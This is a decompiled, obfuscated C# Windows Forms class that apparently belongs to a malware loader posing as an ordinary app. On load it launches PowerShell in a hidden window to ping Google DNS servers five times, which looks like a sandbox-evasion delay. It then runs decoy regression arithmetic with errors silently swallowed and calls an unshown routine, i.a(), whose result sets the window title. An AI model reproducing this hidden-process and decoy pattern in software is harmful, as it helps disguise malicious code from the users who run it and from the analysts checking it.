using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;

namespace Yntmgnmjwxmbnwlr;

public sealed class g : Form
{
	private IContainer m_a;

	private CheckBox m_b;

	public g()
	{
		a();
	}

	private double a(SortedList<int, int> a)
	{
		double num = 0.0;
		double num2 = 0.0;
		double num3 = a.Keys.Average();
		double num4 = a.Values.Average();
		for (int l = 0; l < a.Count; l++)
		{
			num += ((double)a.Keys[l] - num3) * ((double)a.Values[l] - num4);
			num2 += Math.Pow((double)a.Keys[l] - num3, 2.0);
		}
		return num / num2;
	}

	private void a(object sender, EventArgs e)
	{
		for (int l = 0; l < 5; l++)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = "Test-Connection 8.8.8.8, 8.8.4.4, time.google.com",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			})!.WaitForExit(5000);
		}
		try
		{
			SortedList<int, int> sortedList = new SortedList<int, int>
			{
				{ 0, 0 },
				{ 30, 35 },
				{ 70, 90 },
				{ 100, 130 }
			};
			List<int> obj = new List<int> { 10, 20, 40, 50, 60, 80, 190 };
			if (obj.Max() >= sortedList.Keys.Max())
			{
				throw new Exception("The maximum value of the forecast points must be lower!");
			}
			if (obj.Min() <= sortedList.Keys.Min())
			{
				throw new Exception("The minimum value of the forecast points must be higher!");
			}
			double num = sortedList.Keys.Average();
			double num2 = sortedList.Values.Average();
			double num3 = a(sortedList);
			foreach (int item in obj)
			{
				double num4 = num2 - num3 * num + num3 * (double)item;
				sortedList.Add(item, (int)Math.Round(num4));
			}
			Console.WriteLine("\t-KEY-\t-VALUE-");
			foreach (KeyValuePair<int, int> item2 in sortedList)
			{
				Console.WriteLine("\t{0}:\t{1}", item2.Key, item2.Value);
			}
		}
		catch
		{
		}
		i.a();
		this.m_b.set_Checked(true);
	}

	private void b(object sender, EventArgs e)
	{
		string text = i.a();
		((Control)this).set_Text(text);
	}

	protected override void Dispose(bool a)
	{
		if (a && this.m_a != null)
		{
			this.m_a.Dispose();
		}
		((Form)this).Dispose(a);
	}

	private void a()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		this.m_b = new CheckBox();
		((Control)this).SuspendLayout();
		((Control)this.m_b).set_AutoSize(true);
		((Control)this.m_b).set_Location(new Point(375, 217));
		((Control)this.m_b).set_Name("checkBox1");
		((Control)this.m_b).set_Size(new Size(50, 17));
		((Control)this.m_b).set_TabIndex(1);
		((Control)this.m_b).set_Text("open");
		((ButtonBase)this.m_b).set_UseVisualStyleBackColor(true);
		this.m_b.add_CheckedChanged((EventHandler)b);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)this.m_b);
		((Control)this).set_Name("Form2");
		((Control)this).set_Text("Form2");
		((Form)this).add_Load((EventHandler)a);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
